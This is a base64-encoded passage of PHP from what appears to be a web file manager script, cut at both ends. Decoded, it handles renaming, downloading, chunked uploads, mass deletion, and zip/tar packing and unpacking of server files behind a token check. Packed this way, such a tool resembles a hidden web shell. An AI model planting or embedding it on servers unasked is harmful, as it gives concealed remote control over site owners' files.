9kZSgkRk1fUEFUSCkpOw0KfQ0KDQovLyBSZW5hbWUNCmlmIChpc3NldCgkX1BPU1RbJ3JlbmFtZV9mcm9tJ10sICRfUE9TVFsncmVuYW1lX3RvJ10sICRfUE9TVFsndG9rZW4nXSkgJiYgIUZNX1JFQURPTkxZKSB7DQogICAgaWYgKCF2ZXJpZnlUb2tlbigkX1BPU1RbJ3Rva2VuJ10pKSB7DQogICAgICAgIGZtX3NldF9tc2coIkludmFsaWQgVG9rZW4uIiwgJ2Vycm9yJyk7DQogICAgfQ0KICAgIC8vIG9sZCBuYW1lDQogICAgJG9sZCA9IHVybGRlY29kZSgkX1BPU1RbJ3JlbmFtZV9mcm9tJ10pOw0KICAgICRvbGQgPSBmbV9jbGVhbl9wYXRoKCRvbGQpOw0KICAgICRvbGQgPSBzdHJfcmVwbGFjZSgnLycsICcnLCAkb2xkKTsNCiAgICAvLyBuZXcgbmFtZQ0KICAgICRuZXcgPSB1cmxkZWNvZGUoJF9QT1NUWydyZW5hbWVfdG8nXSk7DQogICAgJG5ldyA9IGZtX2NsZWFuX3BhdGgoc3RyaXBfdGFncygkbmV3KSk7DQogICAgJG5ldyA9IHN0cl9yZXBsYWNlKCcvJywgJycsICRuZXcpOw0KICAgIC8vIHBhdGgNCiAgICAkcGF0aCA9IEZNX1JPT1RfUEFUSDsNCiAgICBpZiAoRk1fUEFUSCAhPSAnJykgew0KICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOw0KICAgIH0NCiAgICAvLyByZW5hbWUNCiAgICBpZiAoZm1faXN2YWxpZF9maWxlbmFtZSgkbmV3KSAmJiAkb2xkICE9ICcnICYmICRuZXcgIT0gJycpIHsNCiAgICAgICAgaWYgKGZtX3JlbmFtZSgkcGF0aCAuICcvJyAuICRvbGQsICRwYXRoIC4gJy8nIC4gJG5ldykpIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZihsbmcoJ1JlbmFtZWQgZnJvbScpIC4gJyA8Yj4lczwvYj4gJyAuIGxuZygndG8nKSAuICcgPGI+JXM8L2I+JywgZm1fZW5jKCRvbGQpLCBmbV9lbmMoJG5ldykpKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2coc3ByaW50ZihsbmcoJ0Vycm9yIHdoaWxlIHJlbmFtaW5nIGZyb20nKSAuICcgPGI+JXM8L2I+ICcgLiBsbmcoJ3RvJykgLiAnIDxiPiVzPC9iPicsIGZtX2VuYygkb2xkKSwgZm1fZW5jKCRuZXcpKSwgJ2Vycm9yJyk7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnSW52YWxpZCBjaGFyYWN0ZXJzIGluIGZpbGUgbmFtZScpLCAnZXJyb3InKTsNCiAgICB9DQogICAgJEZNX1BBVEggPSBGTV9QQVRIOw0KICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCn0NCg0KLy8gRG93bmxvYWQNCmlmIChpc3NldCgkX0dFVFsnZGwnXSwgJF9QT1NUWyd0b2tlbiddKSkgew0KICAgIC8vIFZlcmlmeSB0aGUgdG9rZW4gdG8gZW5zdXJlIGl0J3MgdmFsaWQNCiAgICBpZiAoIXZlcmlmeVRva2VuKCRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgZm1fc2V0X21zZygiSW52YWxpZCBUb2tlbi4iLCAnZXJyb3InKTsNCiAgICAgICAgZXhpdDsNCiAgICB9DQoNCiAgICAvLyBDbGVhbiB0aGUgZG93bmxvYWQgZmlsZSBwYXRoDQogICAgJGRsID0gdXJsZGVjb2RlKCRfR0VUWydkbCddKTsNCiAgICAkZGwgPSBmbV9jbGVhbl9wYXRoKCRkbCk7DQogICAgJGRsID0gc3RyX3JlcGxhY2UoJy8nLCAnJywgJGRsKTsgLy8gUHJldmVudCBkaXJlY3RvcnkgdHJhdmVyc2FsIGF0dGFja3MNCg0KICAgIC8vIERlZmluZSB0aGUgZmlsZSBwYXRoDQogICAgJHBhdGggPSBGTV9ST09UX1BBVEg7DQogICAgaWYgKEZNX1BBVEggIT0gJycpIHsNCiAgICAgICAgJHBhdGggLj0gJy8nIC4gRk1fUEFUSDsNCiAgICB9DQoNCiAgICAvLyBDaGVjayBpZiB0aGUgZmlsZSBleGlzdHMgYW5kIGlzIHZhbGlkDQogICAgaWYgKCRkbCAhPSAnJyAmJiBpc19maWxlKCRwYXRoIC4gJy8nIC4gJGRsKSkgew0KICAgICAgICAvLyBDbG9zZSB0aGUgc2Vzc2lvbiB0byBwcmV2ZW50IHNlc3Npb24gbG9ja2luZw0KICAgICAgICBpZiAoc2Vzc2lvbl9zdGF0dXMoKSA9PT0gUEhQX1NFU1NJT05fQUNUSVZFKSB7DQogICAgICAgICAgICBzZXNzaW9uX3dyaXRlX2Nsb3NlKCk7DQogICAgICAgIH0NCg0KICAgICAgICAvLyBDYWxsIHRoZSBkb3dubG9hZCBmdW5jdGlvbg0KICAgICAgICBmbV9kb3dubG9hZF9maWxlKCRwYXRoIC4gJy8nIC4gJGRsLCAkZGwsIDEwMjQpOyAvLyBEb3dubG9hZCB3aXRoIGEgYnVmZmVyIHNpemUgb2YgMTAyNCBieXRlcw0KICAgICAgICBleGl0Ow0KICAgIH0gZWxzZSB7DQogICAgICAgIC8vIEhhbmRsZSB0aGUgY2FzZSB3aGVyZSB0aGUgZmlsZSBpcyBub3QgZm91bmQNCiAgICAgICAgZm1fc2V0X21zZyhsbmcoJ0ZpbGUgbm90IGZvdW5kJyksICdlcnJvcicpOw0KICAgICAgICAkRk1fUEFUSCA9IEZNX1BBVEg7DQogICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICB9DQp9DQoNCi8vIFVwbG9hZA0KaWYgKCFlbXB0eSgkX0ZJTEVTKSAmJiAhRk1fUkVBRE9OTFkpIHsNCiAgICBpZiAoaXNzZXQoJF9QT1NUWyd0b2tlbiddKSkgew0KICAgICAgICBpZiAoIXZlcmlmeVRva2VuKCRfUE9TVFsndG9rZW4nXSkpIHsNCiAgICAgICAgICAgICRyZXNwb25zZSA9IGFycmF5KCdzdGF0dXMnID0+ICdlcnJvcicsICdpbmZvJyA9PiAiSW52YWxpZCBUb2tlbi4iKTsNCiAgICAgICAgICAgIGVjaG8ganNvbl9lbmNvZGUoJHJlc3BvbnNlKTsNCiAgICAgICAgICAgIGV4aXQoKTsNCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgICRyZXNwb25zZSA9IGFycmF5KCdzdGF0dXMnID0+ICdlcnJvcicsICdpbmZvJyA9PiAiVG9rZW4gTWlzc2luZy4iKTsNCiAgICAgICAgZWNobyBqc29uX2VuY29kZSgkcmVzcG9uc2UpOw0KICAgICAgICBleGl0KCk7DQogICAgfQ0KDQogICAgJGNodW5rSW5kZXggPSAkX1BPU1RbJ2R6Y2h1bmtpbmRleCddOw0KICAgICRjaHVua1RvdGFsID0gJF9QT1NUWydkenRvdGFsY2h1bmtjb3VudCddOw0KICAgICRmdWxsUGF0aElucHV0ID0gZm1fY2xlYW5fcGF0aCgkX1JFUVVFU1RbJ2Z1bGxwYXRoJ10pOw0KDQogICAgJGYgPSAkX0ZJTEVTOw0KICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOw0KICAgICRkcyA9IERJUkVDVE9SWV9TRVBBUkFUT1I7DQogICAgaWYgKEZNX1BBVEggIT0gJycpIHsNCiAgICAgICAgJHBhdGggLj0gJy8nIC4gRk1fUEFUSDsNCiAgICB9DQoNCiAgICAkZXJyb3JzID0gMDsNCiAgICAkdXBsb2FkcyA9IDA7DQogICAgJGFsbG93ZWQgPSAoRk1fVVBMT0FEX0VYVEVOU0lPTikgPyBleHBsb2RlKCcsJywgRk1fVVBMT0FEX0VYVEVOU0lPTikgOiBmYWxzZTsNCiAgICAkcmVzcG9uc2UgPSBhcnJheSgNCiAgICAgICAgJ3N0YXR1cycgPT4gJ2Vycm9yJywNCiAgICAgICAgJ2luZm8nICAgPT4gJ09vcHMhIFRyeSBhZ2FpbicNCiAgICApOw0KDQogICAgJGZpbGVuYW1lID0gJGZbJ2ZpbGUnXVsnbmFtZSddOw0KICAgICR0bXBfbmFtZSA9ICRmWydmaWxlJ11bJ3RtcF9uYW1lJ107DQogICAgJGV4dCA9IHBhdGhpbmZvKCRmaWxlbmFtZSwgUEFUSElORk9fRklMRU5BTUUpICE9ICcnID8gc3RydG9sb3dlcihwYXRoaW5mbygkZmlsZW5hbWUsIFBBVEhJTkZPX0VYVEVOU0lPTikpIDogJyc7DQogICAgJGlzRmlsZUFsbG93ZWQgPSAoJGFsbG93ZWQpID8gaW5fYXJyYXkoJGV4dCwgJGFsbG93ZWQpIDogdHJ1ZTsNCg0KICAgIGlmICghZm1faXN2YWxpZF9maWxlbmFtZSgkZmlsZW5hbWUpICYmICFmbV9pc3ZhbGlkX2ZpbGVuYW1lKCRmdWxsUGF0aElucHV0KSkgew0KICAgICAgICAkcmVzcG9uc2UgPSBhcnJheSgNCiAgICAgICAgICAgICdzdGF0dXMnICAgID0+ICdlcnJvcicsDQogICAgICAgICAgICAnaW5mbycgICAgICA9PiAiSW52YWxpZCBGaWxlIG5hbWUhIiwNCiAgICAgICAgKTsNCiAgICAgICAgZWNobyBqc29uX2VuY29kZSgkcmVzcG9uc2UpOw0KICAgICAgICBleGl0KCk7DQogICAgfQ0KDQogICAgJHRhcmdldFBhdGggPSAkcGF0aCAuICRkczsNCiAgICBpZiAoaXNfd3JpdGFibGUoJHRhcmdldFBhdGgpKSB7DQogICAgICAgICRmdWxsUGF0aCA9ICRwYXRoIC4gJy8nIC4gJGZ1bGxQYXRoSW5wdXQ7DQogICAgICAgICRmb2xkZXIgPSBzdWJzdHIoJGZ1bGxQYXRoLCAwLCBzdHJycG9zKCRmdWxsUGF0aCwgIi8iKSk7DQoNCiAgICAgICAgaWYgKCFpc19kaXIoJGZvbGRlcikpIHsNCiAgICAgICAgICAgICRvbGQgPSB1bWFzaygwKTsNCiAgICAgICAgICAgIG1rZGlyKCRmb2xkZXIsIDA3NzcsIHRydWUpOw0KICAgICAgICAgICAgdW1hc2soJG9sZCk7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoZW1wdHkoJGZbJ2ZpbGUnXVsnZXJyb3InXSkgJiYgIWVtcHR5KCR0bXBfbmFtZSkgJiYgJHRtcF9uYW1lICE9ICdub25lJyAmJiAkaXNGaWxlQWxsb3dlZCkgew0KICAgICAgICAgICAgaWYgKCRjaHVua1RvdGFsKSB7DQogICAgICAgICAgICAgICAgJG91dCA9IEBmb3BlbigieyRmdWxsUGF0aH0ucGFydCIsICRjaHVua0luZGV4ID09IDAgPyAid2IiIDogImFiIik7DQogICAgICAgICAgICAgICAgaWYgKCRvdXQpIHsNCiAgICAgICAgICAgICAgICAgICAgJGluID0gQGZvcGVuKCR0bXBfbmFtZSwgInJiIik7DQogICAgICAgICAgICAgICAgICAgIGlmICgkaW4pIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChQSFBfVkVSU0lPTl9JRCA8IDgwMDA5KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gd29ya2Fyb3VuZCBodHRwczovL2J1Z3MucGhwLm5ldC9idWcucGhwP2lkPTgxMTQ1DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZG8gew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKDs7KSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkYnVmZiA9IGZyZWFkKCRpbiwgNDA5Nik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJGJ1ZmYgPT09IGZhbHNlIHx8ICRidWZmID09PSAnJykgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZndyaXRlKCRvdXQsICRidWZmKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gd2hpbGUgKCFmZW9mKCRpbikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdHJlYW1fY29weV90b19zdHJlYW0oJGluLCAkb3V0KTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXNwb25zZSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdzdGF0dXMnICAgID0+ICdzdWNjZXNzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaW5mbycgPT4gImZpbGUgdXBsb2FkIHN1Y2Nlc3NmdWwiDQogICAgICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3N0YXR1cycgICAgPT4gJ2Vycm9yJywNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaW5mbycgPT4gImZhaWxlZCB0byBvcGVuIG91dHB1dCBzdHJlYW0iLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlcnJvckRldGFpbHMnID0+IGVycm9yX2dldF9sYXN0KCkNCiAgICAgICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgQGZjbG9zZSgkaW4pOw0KICAgICAgICAgICAgICAgICAgICBAZmNsb3NlKCRvdXQpOw0KICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCR0bXBfbmFtZSk7DQoNCiAgICAgICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICAgICAnc3RhdHVzJyAgICA9PiAnc3VjY2VzcycsDQogICAgICAgICAgICAgICAgICAgICAgICAnaW5mbycgPT4gImZpbGUgdXBsb2FkIHN1Y2Nlc3NmdWwiDQogICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICAgICAnc3RhdHVzJyAgICA9PiAnZXJyb3InLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ2luZm8nID0+ICJmYWlsZWQgdG8gb3BlbiBvdXRwdXQgc3RyZWFtIg0KICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgIGlmICgkY2h1bmtJbmRleCA9PSAkY2h1bmtUb3RhbCAtIDEpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKGZpbGVfZXhpc3RzKCRmdWxsUGF0aCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRleHRfMSA9ICRleHQgPyAnLicgLiAkZXh0IDogJyc7DQogICAgICAgICAgICAgICAgICAgICAgICAkZnVsbFBhdGhUYXJnZXQgPSAkcGF0aCAuICcvJyAuIGJhc2VuYW1lKCRmdWxsUGF0aElucHV0LCAkZXh0XzEpIC4gJ18nIC4gZGF0ZSgneW1kSGlzJykgLiAkZXh0XzE7DQogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkZnVsbFBhdGhUYXJnZXQgPSAkZnVsbFBhdGg7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgcmVuYW1lKCJ7JGZ1bGxQYXRofS5wYXJ0IiwgJGZ1bGxQYXRoVGFyZ2V0KTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2UgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkdG1wX25hbWUsICRmdWxsUGF0aCkpIHsNCiAgICAgICAgICAgICAgICAvLyBCZSBzdXJlIHRoYXQgdGhlIGZpbGUgaGFzIGJlZW4gdXBsb2FkZWQNCiAgICAgICAgICAgICAgICBpZiAoZmlsZV9leGlzdHMoJGZ1bGxQYXRoKSkgew0KICAgICAgICAgICAgICAgICAgICAkcmVzcG9uc2UgPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICdzdGF0dXMnICAgID0+ICdzdWNjZXNzJywNCiAgICAgICAgICAgICAgICAgICAgICAgICdpbmZvJyA9PiAiZmlsZSB1cGxvYWQgc3VjY2Vzc2Z1bCINCiAgICAgICAgICAgICAgICAgICAgKTsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkcmVzcG9uc2UgPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICdzdGF0dXMnID0+ICdlcnJvcicsDQogICAgICAgICAgICAgICAgICAgICAgICAnaW5mbycgICA9PiAnQ291bGRuXCd0IHVwbG9hZCB0aGUgcmVxdWVzdGVkIGZpbGUuJw0KICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICdzdGF0dXMnICAgID0+ICdlcnJvcicsDQogICAgICAgICAgICAgICAgICAgICdpbmZvJyAgICAgID0+ICJFcnJvciB3aGlsZSB1cGxvYWRpbmcgZmlsZXMuIFVwbG9hZGVkIGZpbGVzICR1cGxvYWRzIiwNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgJHJlc3BvbnNlID0gYXJyYXkoDQogICAgICAgICAgICAnc3RhdHVzJyA9PiAnZXJyb3InLA0KICAgICAgICAgICAgJ2luZm8nICAgPT4gJ1RoZSBzcGVjaWZpZWQgZm9sZGVyIGZvciB1cGxvYWQgaXNuXCd0IHdyaXRlYWJsZS4nDQogICAgICAgICk7DQogICAgfQ0KICAgIC8vIFJldHVybiB0aGUgcmVzcG9uc2UNCiAgICBlY2hvIGpzb25fZW5jb2RlKCRyZXNwb25zZSk7DQogICAgZXhpdCgpOw0KfQ0KDQovLyBNYXNzIGRlbGV0aW5nDQppZiAoaXNzZXQoJF9QT1NUWydncm91cCddLCAkX1BPU1RbJ2RlbGV0ZSddLCAkX1BPU1RbJ3Rva2VuJ10pICYmICFGTV9SRUFET05MWSkgew0KDQogICAgaWYgKCF2ZXJpZnlUb2tlbigkX1BPU1RbJ3Rva2VuJ10pKSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCJJbnZhbGlkIFRva2VuLiIpLCAnZXJyb3InKTsNCiAgICB9DQoNCiAgICAkcGF0aCA9IEZNX1JPT1RfUEFUSDsNCiAgICBpZiAoRk1fUEFUSCAhPSAnJykgew0KICAgICAgICAkcGF0aCAuPSAnLycgLiBGTV9QQVRIOw0KICAgIH0NCg0KICAgICRlcnJvcnMgPSAwOw0KICAgICRmaWxlcyA9ICRfUE9TVFsnZmlsZSddOw0KICAgIGlmIChpc19hcnJheSgkZmlsZXMpICYmIGNvdW50KCRmaWxlcykpIHsNCiAgICAgICAgZm9yZWFjaCAoJGZpbGVzIGFzICRmKSB7DQogICAgICAgICAgICBpZiAoJGYgIT0gJycpIHsNCiAgICAgICAgICAgICAgICAkbmV3X3BhdGggPSAkcGF0aCAuICcvJyAuICRmOw0KICAgICAgICAgICAgICAgIGlmICghZm1fcmRlbGV0ZSgkbmV3X3BhdGgpKSB7DQogICAgICAgICAgICAgICAgICAgICRlcnJvcnMrKzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRlcnJvcnMgPT0gMCkgew0KICAgICAgICAgICAgZm1fc2V0X21zZyhsbmcoJ1NlbGVjdGVkIGZpbGVzIGFuZCBmb2xkZXIgZGVsZXRlZCcpKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGZtX3NldF9tc2cobG5nKCdFcnJvciB3aGlsZSBkZWxldGluZyBpdGVtcycpLCAnZXJyb3InKTsNCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdOb3RoaW5nIHNlbGVjdGVkJyksICdhbGVydCcpOw0KICAgIH0NCg0KICAgICRGTV9QQVRIID0gRk1fUEFUSDsNCiAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQp9DQoNCi8vIFBhY2sgZmlsZXMgemlwLCB0YXINCmlmIChpc3NldCgkX1BPU1RbJ2dyb3VwJ10sICRfUE9TVFsndG9rZW4nXSkgJiYgKGlzc2V0KCRfUE9TVFsnemlwJ10pIHx8IGlzc2V0KCRfUE9TVFsndGFyJ10pKSAmJiAhRk1fUkVBRE9OTFkpIHsNCg0KICAgIGlmICghdmVyaWZ5VG9rZW4oJF9QT1NUWyd0b2tlbiddKSkgew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygiSW52YWxpZCBUb2tlbi4iKSwgJ2Vycm9yJyk7DQogICAgfQ0KDQogICAgJHBhdGggPSBGTV9ST09UX1BBVEg7DQogICAgJGV4dCA9ICd6aXAnOw0KICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7DQogICAgfQ0KDQogICAgLy9zZXQgcGFjayB0eXBlDQogICAgJGV4dCA9IGlzc2V0KCRfUE9TVFsndGFyJ10pID8gJ3RhcicgOiAnemlwJzsNCg0KICAgIGlmICgoJGV4dCA9PSAiemlwIiAmJiAhY2xhc3NfZXhpc3RzKCdaaXBBcmNoaXZlJykpIHx8ICgkZXh0ID09ICJ0YXIiICYmICFjbGFzc19leGlzdHMoJ1BoYXJEYXRhJykpKSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdPcGVyYXRpb25zIHdpdGggYXJjaGl2ZXMgYXJlIG5vdCBhdmFpbGFibGUnKSwgJ2Vycm9yJyk7DQogICAgICAgICRGTV9QQVRIID0gRk1fUEFUSDsNCiAgICAgICAgZm1fcmVkaXJlY3QoRk1fU0VMRl9VUkwgLiAnP3A9JyAuIHVybGVuY29kZSgkRk1fUEFUSCkpOw0KICAgIH0NCg0KICAgICRmaWxlcyA9ICRfUE9TVFsnZmlsZSddOw0KICAgICRzYW5pdGl6ZWRfZmlsZXMgPSBhcnJheSgpOw0KDQogICAgLy8gY2xlYW4gcGF0aA0KICAgIGZvcmVhY2ggKCRmaWxlcyBhcyAkZmlsZSkgew0KICAgICAgICBhcnJheV9wdXNoKCRzYW5pdGl6ZWRfZmlsZXMsIGZtX2NsZWFuX3BhdGgoJGZpbGUpKTsNCiAgICB9DQoNCiAgICAkZmlsZXMgPSAkc2FuaXRpemVkX2ZpbGVzOw0KDQogICAgaWYgKCFlbXB0eSgkZmlsZXMpKSB7DQogICAgICAgIGNoZGlyKCRwYXRoKTsNCg0KICAgICAgICBpZiAoY291bnQoJGZpbGVzKSA9PSAxKSB7DQogICAgICAgICAgICAkb25lX2ZpbGUgPSByZXNldCgkZmlsZXMpOw0KICAgICAgICAgICAgJG9uZV9maWxlID0gYmFzZW5hbWUoJG9uZV9maWxlKTsNCiAgICAgICAgICAgICR6aXBuYW1lID0gJG9uZV9maWxlIC4gJ18nIC4gZGF0ZSgneW1kX0hpcycpIC4gJy4nIC4gJGV4dDsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICR6aXBuYW1lID0gJ2FyY2hpdmVfJyAuIGRhdGUoJ3ltZF9IaXMnKSAuICcuJyAuICRleHQ7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoJGV4dCA9PSAnemlwJykgew0KICAgICAgICAgICAgJHppcHBlciA9IG5ldyBGTV9aaXBwZXIoKTsNCiAgICAgICAgICAgICRyZXMgPSAkemlwcGVyLT5jcmVhdGUoJHppcG5hbWUsICRmaWxlcyk7DQogICAgICAgIH0gZWxzZWlmICgkZXh0ID09ICd0YXInKSB7DQogICAgICAgICAgICAkdGFyID0gbmV3IEZNX1ppcHBlcl9UYXIoKTsNCiAgICAgICAgICAgICRyZXMgPSAkdGFyLT5jcmVhdGUoJHppcG5hbWUsICRmaWxlcyk7DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoJHJlcykgew0KICAgICAgICAgICAgZm1fc2V0X21zZyhzcHJpbnRmKGxuZygnQXJjaGl2ZScpIC4gJyA8Yj4lczwvYj4gJyAuIGxuZygnQ3JlYXRlZCcpLCBmbV9lbmMoJHppcG5hbWUpKSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBmbV9zZXRfbXNnKGxuZygnQXJjaGl2ZSBub3QgY3JlYXRlZCcpLCAnZXJyb3InKTsNCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdOb3RoaW5nIHNlbGVjdGVkJyksICdhbGVydCcpOw0KICAgIH0NCg0KICAgICRGTV9QQVRIID0gRk1fUEFUSDsNCiAgICBmbV9yZWRpcmVjdChGTV9TRUxGX1VSTCAuICc/cD0nIC4gdXJsZW5jb2RlKCRGTV9QQVRIKSk7DQp9DQoNCi8vIFVucGFjayB6aXAsIHRhcg0KaWYgKGlzc2V0KCRfUE9TVFsndW56aXAnXSwgJF9QT1NUWyd0b2tlbiddKSAmJiAhRk1fUkVBRE9OTFkpIHsNCg0KICAgIGlmICghdmVyaWZ5VG9rZW4oJF9QT1NUWyd0b2tlbiddKSkgew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygiSW52YWxpZCBUb2tlbi4iKSwgJ2Vycm9yJyk7DQogICAgfQ0KDQogICAgJHVuemlwID0gdXJsZGVjb2RlKCRfUE9TVFsndW56aXAnXSk7DQogICAgJHVuemlwID0gZm1fY2xlYW5fcGF0aCgkdW56aXApOw0KICAgICR1bnppcCA9IHN0cl9yZXBsYWNlKCcvJywgJycsICR1bnppcCk7DQogICAgJGlzVmFsaWQgPSBmYWxzZTsNCg0KICAgICRwYXRoID0gRk1fUk9PVF9QQVRIOw0KICAgIGlmIChGTV9QQVRIICE9ICcnKSB7DQogICAgICAgICRwYXRoIC49ICcvJyAuIEZNX1BBVEg7DQogICAgfQ0KDQogICAgaWYgKCR1bnppcCAhPSAnJyAmJiBpc19maWxlKCRwYXRoIC4gJy8nIC4gJHVuemlwKSkgew0KICAgICAgICAkemlwX3BhdGggPSAkcGF0aCAuICcvJyAuICR1bnppcDsNCiAgICAgICAgJGV4dCA9IHBhdGhpbmZvKCR6aXBfcGF0aCwgUEFUSElORk9fRVhURU5TSU9OKTsNCiAgICAgICAgJGlzVmFsaWQgPSB0cnVlOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGZtX3NldF9tc2cobG5nKCdGaWxlIG5vdCBmb3VuZCcpLCAnZXJyb3InKTsNCiAgICB9DQoNCiAgICBpZiAoKCRleHQgPT0gInppcCIgJiYgIWNsYXNzX2V4aXN0cygnWmlwQXJjaGl2ZScpKSB8fCAoJGV4dCA9PSAidGFyIiAmJiAhY2xhc3NfZXhpc3RzKCdQaGFyRGF0YScpKSkgew0KICAgICAgICBmbV9zZXRfbXNnKGxuZygnT3BlcmF0aW9ucyB3aXRoIGFyY2hpdmVzIGFyZSBub3QgYXZhaWxhYmxlJyksICdlcnJvcicpOw0KICAgICAgICAkRk1fUEFUSCA9IEZNX1BBVEg7DQogICAgICAgIGZtX3JlZGlyZWN0KEZNX1NFTEZfVVJMIC4gJz9wPScgLiB1cmxlbmNvZGUoJEZNX1BBVEgpKTsNCiAgICB9DQoNCiAgICBpZiAoJGlzVmFsaWQpIHsNCiAgICAgICAgLy90byBmb2xkZXINCiAgICAgICAgJHRvZm9sZGVyID0gJyc7DQogICAgICAgIGlmIChpc3NldCgkX1BPU1RbJ3RvZm9sZGVyJ10pKSB7DQogICAgICAgICAgICAkdG9mb2xkZXIgPSBwYXRoaW5mbygkemlwX3BhdGgsIFBBVEhJTkZPX0ZJTEVOQU1FKTsNCiAgICAgICAgICAgIGlmIChmbV9ta2RpcigkcGF0aCAuICcvJyAuICR0b2ZvbGRlciwgdHJ1ZSkpIHsNCiAgICAgICAgICAgICAgICAkcGF0aCAuPSAnLycgLiAkdG9mb2xkZXI7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBpZiAoJGV4dCA9PSAiemlwIikgew0KICAgICAgICAgICAgJHppcHBlciA9IG5ldyBGTV9aaXBwZXIoKTsNCiAgICAgICAgICAgICRyZXMgPSAkemlwcGVyLT51bnppcCgkemlwX3BhdGgsICRwYXRoKTsNCiAgICAgICAgfSBlbHNlaWYgKCRleHQgPT0gInRhciIpIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgJGd6aXBwZXIgPSBuZXcgUGhhckRhdGEoJHppcF9wYXRoKTsNCiAgICAgICAgICAgICAgICBpZiAoQCRnemlwcGVyLT5leHRyYWN0VG8oJHBhdGgsIG51bGwsIHRydWUpKSB7DQogICAgICAgICAgICAgICAgICAgICRyZXMgPSB0cnVlOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQ